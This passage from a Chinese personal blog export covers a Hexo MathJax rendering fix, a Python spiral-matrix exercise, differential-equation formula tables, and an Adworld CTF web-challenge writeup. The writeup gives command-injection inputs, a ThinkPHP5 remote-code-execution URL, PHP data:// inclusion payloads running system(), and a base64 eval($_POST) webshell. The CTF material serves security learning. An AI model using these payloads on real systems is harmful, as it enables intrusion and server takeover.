<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>Hexo 默认使用 hexo-renderer-marked 引擎渲染网页，该引擎会把一些特殊的 markdown 符号转换为相应的 html 标签，比如在 markdown 语法中，下划线_代表斜体，会被渲染引擎处理为<em>标签。</em></p>
<p>因为类 Latex 格式书写的数学公式下划线_表示下标，有特殊的含义，如果被强制转换为<em>标签，那么 MathJax 引擎在渲染数学公式的时候就会出错。</em></p>
<p>类似的语义冲突的符号还包括*, {, }, \\等。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>更换 Hexo 的 markdown 渲染引擎，hexo-renderer-kramed 引擎是在默认的渲染引擎 hexo-renderer-marked 的基础上修改了一些 bug ，两者比较接近，也比较轻量级。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<p>执行上面的命令即可，先卸载原来的渲染引擎，再安装新的。<br>然后，跟换引擎后行间公式可以正确渲染了，但是这样还没有完全解决问题，行内公式的渲染还是有问题，因为 hexo-renderer-kramed 引擎也有语义冲突的问题。接下来到博客根目录下，找到node_modules\kramed\lib\rules\inline.js，把第11行的 escape 变量的值做相应的修改:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span></span><br><span class="line"><span class="attr">escape</span>: <span class="regexp">/^\\([`*\[\]()#$+\-.!_&gt;])/</span>,</span><br></pre></td></tr></table></figure>
<p>这一步是在原基础上取消了对\,{,}的转义(escape)。<br>同时把第20行的em变量也要做相应的修改。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span></span><br><span class="line"> <span class="attr">em</span>: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br></pre></td></tr></table></figure>
<p>重新启动hexo（先clean再generate）,问题完美解决。哦，如果不幸还没解决的话，看看是不是还需要在使用的主题中配置mathjax开关。</p>
<h2 id="在Next主题中开启MathJax开关"><a href="#在Next主题中开启MathJax开关" class="headerlink" title="在Next主题中开启MathJax开关"></a>在Next主题中开启MathJax开关</h2><p>进入到主题目录，找到 _config.yml 配置问题，把 mathjax 默认的 false 修改为true，具体如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MathJax Support</span><br><span class="line">mathjax:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: true</span><br></pre></td></tr></table></figure>
<p>别着急，这样还不够，还需要在文章的Front-matter里打开mathjax开关，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: index.html</span><br><span class="line">date: 2020-04-17 16:16:32</span><br><span class="line">tags:</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>—</p>
<p>不要嫌麻烦，之所以要在文章头里设置开关，是因为考虑只有在用到公式的页面才加载 Mathjax，这样不需要渲染数学公式的页面的访问速度就不会受到影响了。</p>
<p>本文参考链接：<a href="http://xudongyang.coding.me/math-in-hexo/">http://xudongyang.coding.me/math-in-hexo/</a></p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>回形取数</title>
    <url>/2020/02/02/%E5%9B%9E%E5%BD%A2%E5%8F%96%E6%95%B0/</url>
    <content><![CDATA[<h3 id="本题为蓝桥杯回形取数的python题解。"><a href="#本题为蓝桥杯回形取数的python题解。" class="headerlink" title="本题为蓝桥杯回形取数的python题解。"></a>本题为蓝桥杯回形取数的python题解。</h3><span id="more"></span>
<p><img src="/2020/02/02/%E5%9B%9E%E5%BD%A2%E5%8F%96%E6%95%B0/回形取数.png" alt="题目描述"><br>这个题目按照下右上左的顺序取数，并对每个取过的数进行标记。<br>一下代码提交后为runtime error，不太清楚为啥。之后再继续找找原因<br><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"># str1 = input()</span><br><span class="line"># arr1 = str1.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"># m = int(arr1[<span class="number">0</span>])</span><br><span class="line"># n = int(arr1[<span class="number">1</span>])</span><br><span class="line">m,n = map(int,input().split()) #简单写法</span><br><span class="line"><span class="symbol">Arr</span> = [[] for i in range(m)]</span><br><span class="line"><span class="symbol">Arr</span> = [[] * n] * m</span><br><span class="line">for i in range(m):</span><br><span class="line">    <span class="symbol">Arr</span>[i] = [int(j) for j in input().split()]</span><br><span class="line">#for i in range(m):</span><br><span class="line">#    str2 = input()</span><br><span class="line">#    <span class="symbol">Arr</span>[i] = str2.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">sum = m * n</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">while sum &gt; <span class="number">0</span>: #取过的数赋值为<span class="number">-1</span></span><br><span class="line">    while i &lt; m and <span class="symbol">Arr</span>[i][j] != <span class="number">-1</span>: #向下取数</span><br><span class="line">        print(<span class="symbol">Arr</span>[i][j],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="symbol">Arr</span>[i][j] = <span class="number">-1</span></span><br><span class="line">        sum -= <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    while j &lt; n and <span class="symbol">Arr</span>[i][j] != <span class="number">-1</span>: #向右取数</span><br><span class="line">        print(<span class="symbol">Arr</span>[i][j],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="symbol">Arr</span>[i][j] = <span class="number">-1</span></span><br><span class="line">        sum -= <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    j -= <span class="number">1</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">    while i &gt;= <span class="number">0</span> and <span class="symbol">Arr</span>[i][j] != <span class="number">-1</span>: #向上取数</span><br><span class="line">        print(<span class="symbol">Arr</span>[i][j],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="symbol">Arr</span>[i][j] = <span class="number">-1</span></span><br><span class="line">        sum -= <span class="number">1</span></span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    j -= <span class="number">1</span></span><br><span class="line">    while j &gt;= <span class="number">0</span> and <span class="symbol">Arr</span>[i][j] != <span class="number">-1</span>: #向左取数</span><br><span class="line">        print(<span class="symbol">Arr</span>[i][j],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="symbol">Arr</span>[i][j] = <span class="number">-1</span></span><br><span class="line">        sum -= <span class="number">1</span></span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>programming</category>
      </categories>
      <tags>
        <tag>programming</tag>
      </tags>
  </entry>
  <entry>
    <title>数二公式</title>
    <url>/2021/04/28/%E6%95%B0%E4%BA%8C%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="常微分方程"><a href="#常微分方程" class="headerlink" title="常微分方程"></a>常微分方程</h2><h3 id="一阶微分方程的种类与解法"><a href="#一阶微分方程的种类与解法" class="headerlink" title="一阶微分方程的种类与解法"></a>一阶微分方程的种类与解法</h3><div class="table-container">
<table>
<thead>
<tr>
<th>种类</th>
<th>通解公式或解法</th>
</tr>
</thead>
<tbody>
<tr>
<td>可分离变量的微分方程<br>$\frac{dy}{dx}=f(x,y)$,其中$f(x,y)=\varPhi_1(x)\varPhi_2(y)$</td>
<td>解法：<br> $\frac{dy}{dx}=f(x,y)\implies\frac{dy}{dx}=\varPhi_1(x)\varPhi_2(y)$ <br> $\implies\frac{dy}{\varPhi_2(y)}=\varPhi_1(x)dx$ <br> $\implies\int\frac{dy}{\varPhi_2(y)}=\int\varPhi_1(x)dx+C$</td>
</tr>
<tr>
<td>齐次微分方程<br>$\frac{dy}{dx}=f(x,y)$，其中$f(x,y)=\varPhi(\frac{y}{x})$</td>
<td>解法：<br> $\frac{dy}{dx}=f(x,y)\implies\frac{dy}{dx}=\varPhi(\frac{y}{x})$<br>$\xRightarrow{\frac{y}{x}=u} u+x\frac{du}{dx}=\varPhi(u)$<br>$\implies \int \frac{du}{\varPhi(u)-u}=\int \frac{dx}{x}+C$</td>
</tr>
<tr>
<td>一阶齐次线性微分方程<br>$\frac{dy}{dx}+P(x)y=0$</td>
<td>通解公式：<br> $y = Ce^{-\int P(x)dx}$(其中C为任意常数)</td>
</tr>
<tr>
<td>一阶非齐次线性微分方程 <br> $\frac{dy}{dx}+P(x)y=Q(x)$</td>
<td>通解公式：<br> $y=[\int Q(x)e^{\int P(x)dx}dx+C]e^{-\int P(x)dx}$(其中C为任意常数)</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可降阶的高阶微分方程及解法"><a href="#可降阶的高阶微分方程及解法" class="headerlink" title="可降阶的高阶微分方程及解法"></a>可降阶的高阶微分方程及解法</h3><div class="table-container">
<table>
<thead>
<tr>
<th>种类</th>
<th>解法</th>
</tr>
</thead>
<tbody>
<tr>
<td>$y^{(n)}=f(x)$</td>
<td>$y^{(n)}=f(x)$进行n次不定积分</td>
</tr>
<tr>
<td>$f(x,y’,y’’)=0$</td>
<td>令$y’=p,y’’=\frac{dp}{dx},f(x,y’,y’’)=0$化为$f(x,p,\frac{dp}{dx})=0$</td>
</tr>
<tr>
<td>$f(y,y’,y’’)=0$</td>
<td>$y’=p,y’’=\frac{dp}{dx}\cdot\frac{dp}{dy}=p\frac{dp}{dy},f(y,y’,y’’)=0$化为$f(y,p,p\frac{dp}{dy})=0$</td>
</tr>
</tbody>
</table>
</div>
<h3 id="高阶线性微分方程理论"><a href="#高阶线性微分方程理论" class="headerlink" title="高阶线性微分方程理论"></a>高阶线性微分方程理论</h3><p><strong>n阶齐次线性微分方程</strong><br>形如</p>
<script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=0 \tag{1}</script><p><strong>n阶非齐次线性微分方程</strong><br>形如</p>
<script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=f(x) \tag{2}</script><p>若$f(x)=f_1(x)+f_2(x)$,则(2)可分解为如下两个方程：</p>
<script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=f_1(x) \tag{2.1}</script><script type="math/tex; mode=display">y^{n}+a_1y^{n-1}+...+a_{n-1}y'+a_n(x)y=f_2(x) \tag{2.2}</script><h4 id="高阶线性微分方程解的结构"><a href="#高阶线性微分方程解的结构" class="headerlink" title="高阶线性微分方程解的结构"></a>高阶线性微分方程解的结构</h4><ol>
<li>设$\varPhi_1(x),\varPhi_2(x),…,\varPhi_s(x)$为(1)的一组解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_s\varPhi_s(x)$也为方程(1)的解</li>
<li>若$\varPhi_1(x),\varPhi_2(x)$分别为(1)、(2)的两个解，则$\varPhi_1(x)+\varPhi_2(x)$为(2)的一个解</li>
<li>若$\varPhi_1(x),\varPhi_2(x)$为(2)的两个解，则$\varPhi_1(x)-\varPhi_2(x)$为(1)的解</li>
<li>若$\varPhi_1(x),\varPhi_2(x)$分别为(2.1)及(2.2)的两个解，则$\varPhi_1(x)+\varPhi_2(x)$为(2)的解</li>
<li>若$\varPhi_1(x),\varPhi_2(x),…,\varPhi_s(x)$为(2)的一组解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_s\varPhi_s(x)$为(2)的解的充分必要条件是$k_1+k_2+…+k_s=1$</li>
<li>若$\varPhi_1(x),\varPhi_2(x),…,\varPhi_s(x)$为(2)的一组解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_s\varPhi_s(x)$为(1)的解的充分必要条件是$k_1+k_2+…+k_s=0$</li>
<li>设$\varPhi_1(x),\varPhi_2(x),…,\varPhi_n(x)$为(1)的n个线性无关解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_n\varPhi_n(x)$为(1)的通解</li>
<li>若$\varPhi_1(x),\varPhi_2(x),…,\varPhi_n(x)$为(1)的n个线性无关解，$\varPhi_0(x)$为(2)的一个特解，则$k_1\varPhi_1(x)+k_2\varPhi_2(x)+…+k_n\varPhi_n(x)+\varPhi_0(x)$为(2)的通解</li>
</ol>
<h4 id="二阶常系数齐次线性微分方程及解法"><a href="#二阶常系数齐次线性微分方程及解法" class="headerlink" title="二阶常系数齐次线性微分方程及解法"></a>二阶常系数齐次线性微分方程及解法</h4><div class="table-container">
<table>
<thead>
<tr>
<th>方程形式</th>
<th>$y’’+py’+qy=0$(其中p，q为常数)</th>
</tr>
</thead>
<tbody>
<tr>
<td>特征方程</td>
<td>$\lambda^2+p\lambda+q=0$</td>
</tr>
<tr>
<td>$\Delta=p^2-4q$的情况</td>
<td>$y’’+py’+qy=0$的通解</td>
</tr>
<tr>
<td>$\Delta&gt;0$</td>
<td>$y=C_1e^{\lambda_1x}+C_2^{\lambda_2x}$($C_1,C_2$为任意常数)</td>
</tr>
<tr>
<td>$\Delta=0$</td>
<td>$y=(C_1+C_2x)e^{\lambda_1x}$($C_1,C_2$为任意常数)</td>
</tr>
<tr>
<td>$\Delta&lt;0$</td>
<td>$\lambda_1=\alpha+i\beta,\lambda_2=\alpha-i\beta$ <br> $y=e^{\alpha x}(C_1\cos\beta x+C_2\sin\beta x)$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="三阶常系数齐次线性微分方程及解法"><a href="#三阶常系数齐次线性微分方程及解法" class="headerlink" title="三阶常系数齐次线性微分方程及解法"></a>三阶常系数齐次线性微分方程及解法</h4><p>对$y’’’+py’’+qy’+ry=0$(其中p，q，r为常数)，特征方程为</p>
<script type="math/tex; mode=display">\lambda^3+p\lambda^2+q\lambda+r=0</script><p>(1) 若特征值$\lambda_1,\lambda_2,\lambda_3$为实单根，则通解为$y=C_1e^{\lambda_1x}+C_2^{\lambda_2x}+C_3e^{\lambda_3x}$<br>(2) 若特征值$\lambda_1=\lambda_2\not=\lambda_3$为实根，则通解为$y=(C_1+C_2x)e^{\lambda_1x}+C_3e^{\lambda_3x}$<br>(3) 若特征值$\lambda_1=\lambda_2=\lambda_3$为实根，则通解为$y=(C_1+C_2x+C_3x^2)e^{\lambda_1x}$<br>(4) 若$\lambda_{1,2}=\alpha\pm i\beta,\lambda_3\in R$，则通解为$y=e^{\alpha x}(C_1\cos\beta x+C_2\sin\beta x))+C_3e^{\lambda_3x}$</p>
<h4 id="二阶常系数非齐次线性微分方程的特解求法"><a href="#二阶常系数非齐次线性微分方程的特解求法" class="headerlink" title="二阶常系数非齐次线性微分方程的特解求法"></a>二阶常系数非齐次线性微分方程的特解求法</h4><p>类型一：$f(x)=e^{kx}P_n(x)$，其中$P_n(x)$为n次多项式</p>
<p>(1) 当$k\not ={\lambda_1}$且$k\not ={\lambda_2}$时，令特解$y_0(x)=(a_0+a_1x+…+a_nx^n)e^{kx}=Q(x)e^{kx}$<br>(2) 当$k={\lambda_1}$且$k\not ={\lambda_2}$时，令特解$y_0(x)=x(a_0+a_1x+…+a_nx^n)e^{kx}=xQ(x)e^{kx}$<br>(3) 当$k={\lambda_1}={\lambda_2}$时，令特解$y_0(x)=x^2(a_0+a_1x+…+a_nx^n)e^{kx}=x^2Q(x)e^{kx}$</p>
<p>类型二：$f(x)=e^{kx}[P_m(x)cos\beta x+P_s(x)sin\beta x]$，其中$P_m,P_s(x)$分别为m及s次多项式</p>
<p>(1) 当$\alpha+i\beta$不是特征值时，令$y_0=e^{ax}[Q_n^{(1)}(x)cos\beta x+Q_n^{2}(x)sin\beta x$，其中n=max{m,s}，且$Q_n^{1}(x),Q_n^{2}(x)$为两个n次多项式<br>(2) 当$\alpha+i\beta$是特征值时，令$y_0=xe^{ax}[Q_n^{(1)}(x)cos\beta x+Q_n^{2}(x)sin\beta x$，其中n=max{m,s}，且$Q_n^{1}(x),Q_n^{2}(x)$为两个n次多项式</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Web WP</title>
    <url>/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/</url>
    <content><![CDATA[<h2 id="攻防世界WebWp"><a href="#攻防世界WebWp" class="headerlink" title="攻防世界WebWp"></a>攻防世界WebWp</h2><p>本文为攻防世界web区的writeup。<br><span id="more"></span></p>
<p><a href="https://adworld.xctf.org.cn/">题目地址</a></p>
<h3 id="view-source"><a href="#view-source" class="headerlink" title="view-source"></a>view-source</h3><p>打开直接右键得到flag。</p>
<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>robots是一个爬虫协议，规定了访客可以访问哪些文件，以.txt文本显示。在地址栏后添加robots.txt进入robots页面。<br>显示flag_ls_h3re.php，然后访问，得到flag。</p>
<h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>.bak为电脑自动设置的备份文件。<br>直接地址添加/index.php.bak可得备份文件，打开可得flag。</p>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>这道题两种做法<br>第一种：<br>直接f12，打开network，<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/01.png" alt="f3738a25ab605fb8b8784491c5d5d040.png"><br>然后在地址栏加入cookie.php<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/02.png" alt="06588c1507fd173426276b57b1bc78c6.png"><br>得到flag<br>第二种：bp<br>抓包<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/03.png" alt="47324d9ace2eb7d38401ec00e3d4712b.png"><br>然后在地址栏加入cookie.php，再次抓包<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/04.png" alt="58b7bd929b82db184ea5de4a06f57aa2.png"><br>也可得到flag。</p>
<h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>打开后有个不能按的按钮，f12，发现属性为disabled<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/05.png" alt="fe780a899cc3c93e902cd2152b5affcc.png"><br>把这个删掉，刷新，得到flag。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/06.png" alt="a6f9938bcbbeea57a26079e2c846572f.png"></p>
<h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>进去是这个页面，是爆破没错了。<br>先随便输入一下，弹窗提示为admin登录，那么用户名应该为admin了。接着就是弱口令，直接bp。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/07.png" alt="fc49e7907a0c4e73ea41c09d35a41fb0.png"><br>抓包，送到Intruder，payload选择passwords<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/08.png" alt="7747c15f7d116759e4663af4910c97f4.png"><br>开始爆破。<br>然后找到长度不一样的即为密码。<br>然后登录即可找到flag。</p>
<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>构造地址如下：<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/09.png" alt="ef06b27efbeaeceb70a6d0a74f699a78.png"><br>php是弱类型，所以’0’==0成立，b能是数字，可以构造b为数组b[]=5678，或者在b后加字母，比较时默认只比较数字部分。</p>
<h3 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h3><p>这个就是简单的get，post了。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/10.png" alt="1186692dbbbcd5c3bb80c810b428c343.png"></p>
<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>提示ip地址为123.123.123.123<br>该题掌握X-Forwarded-For和Referer的知识：<br>简称XFF，代表客户端，是HTTP的请求端真实的IP。<br>Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。<br>用bp抓包修改<br>右键送到Repeater，添加X-Forwarded-For:123.123.123.123，go，显示如下页面<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/11.png" alt="d0eab203ed63605eade4469542c943dc.png"><br>还要构造referer。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/12.png" alt="5a7243e1dbb8e1ec66250fa2b5be76c3.png"><br>得出flag。</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>这道题就是菜刀的基本使用。<br>打开菜刀输入url，<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/13.png" alt="f9713fc76cf46bad206a7058fe79d3e5.png"><br>打开flag.txt得到flag。</p>
<h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>这是命令执行漏洞，也就是用户通过浏览器在远程服务器上执行任意系统命令，这是第一次接触。参考了网上的wp。<br>先试一下本机127.0.0.1，有回显。<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/14.png" alt="5552db0ea1c328d3cd82b16311af227b.png"><br>这个是可以添加连接符的，比如&amp;&amp;||等，这里试一下输入127.0.0.1&amp;&amp;dir<br>dir就是显示目录内容。<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/15.png" alt="25da5b930a0600f6a16b047bd5ae061a.png"><br>回显有index.php<br>然后试试输入flag关键词</p>
<blockquote>
<p>127.0.0.1 &amp;&amp; find / -name “flag.*”</p>
</blockquote>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/16.png" alt="26fb9ef994a699ca100e4f2ba704627d.png"></p>
<p>找到位置，然后开始输入</p>
<blockquote>
<p>127.0.0.1 &amp;&amp; cat /home/flag.txt</p>
</blockquote>
<p>得到flag。</p>
<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>查看源代码，是js代码。整理一下。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/17.png" alt="4be7a3fec6b950d9c10e7bb8c5ad816d.png"><br>代码功能是把一串用逗号分隔的数字按ascii转成字符串，然后输出。</p>
<p>代码有很多没有用的变量，需要进行修改。<br>代码中有这样的ascii串，</p>
<blockquote>
<p>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</p>
</blockquote>
<p>转码后为55,56,54,79,115,69,114,116,107,49,50<br>再通过ascii转换<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/18.png" alt="281beda85aabf6c406af0984f3958bfb.png"><br>连起来就是flag。</p>
<h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>提示说初始页面，想到index.html,不行又试了试index.php，到network里边响应头找到flag。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/19.png" alt="bf357a9dcbe4bc5f3b6c6ce1ebe5889f.png"></p>
<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>提示robots，先看看robots文件，<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/20.png" alt="4a00ff9dcd6407567359d55d029b173a.png"><br>有个fl0g.php，打开看看。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/21.png" alt="dafa7304aed10e61657aba39dc534c5a.png"><br>得到flag。</p>
<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>打开试了半天，不知道是干哈的，没办法，搜一下吧。是thinkphp5 rce漏洞，这个以前没有见过。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/22.png" alt="6c7f65ceff78de22ac1b3536a1421eec.png"><br><a href="https://blog.csdn.net/qq_40884727/article/details/101452478">ThinkPHP5.x rec漏洞分析与复现</a><br>先看一下thinkphp的版本号，然后对症下药。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/23.png" alt="71744c42f55e1c06d4fc2725917d0ca7.png"><br>然后去百度查找该版本poc。<br>查找flag，构造payload</p>
<blockquote>
<p><a href="http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22">http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22</a></p>
</blockquote>
<p>然后查看flag</p>
<blockquote>
<p><a href="http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22">http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22</a></p>
</blockquote>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/24.png" alt="0bd59f138ff2510526a68df393e9c74d.png"></p>
<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>php函数</p>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/25.png" alt="623abf7bde3354bcbec59c622035b03a.png"></p>
<p>可知程序过滤掉了page=参数传入php://</p>
<p><strong>第一种方法（大小写绕过）：</strong></p>
<blockquote>
<p>strstr() 搜索字符串在另一字符串的第一次出现（区分大小写）。</p>
<p>str_replace() 以其他字符替换字符串中的一些字符（区分大小写）。</p>
</blockquote>
<p>根据strstr的区分大小写，构造</p>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/26.png" alt="5c39025de563306dd04b59f4b2590ed7.png"><br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/27.png" alt="85848961451ec6ac1dfb4bc5b0d32246.png"></p>
<p>然后查看flag</p>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/28.png" alt="8f1f7571cd26368cbe3ef524ac709ce7.png"></p>
<p><strong>第二种（data://伪协议执行命令利用）</strong></p>
<p>该题过滤了php://伪协议，可以使用其他协议，使用data://伪协议<br><em>data://伪协议</em><br>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行代码。<br>使用方法：</p>
<blockquote>
<p>data://text/plain;base64,xxxx(base64编码后的数据)</p>
</blockquote>
<p>&lt;?php system(“dir”)?&gt; base64编码后使用</p>
<blockquote>
<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b</a></p>
</blockquote>
<p>注意编码后+号要用url编码<br>&lt;?php system(“cat fl4gisisish3r3.php”)?&gt; base64编码后使用</p>
<blockquote>
<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</a></p>
</blockquote>
<p>查看源代码可得到flag。</p>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/29.png" alt="bf9fad42f730d52e509a19a34852fd96.png"></p>
<p><strong>第三种方法(data://伪协议传木马）</strong></p>
<p>&lt;?php eval($_POST[xiaohua]); ?&gt; base64加密后拼接</p>
<blockquote>
<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==</a></p>
</blockquote>
<p>菜刀连接（这个我连接时没有出现flag，可能不可行）</p>
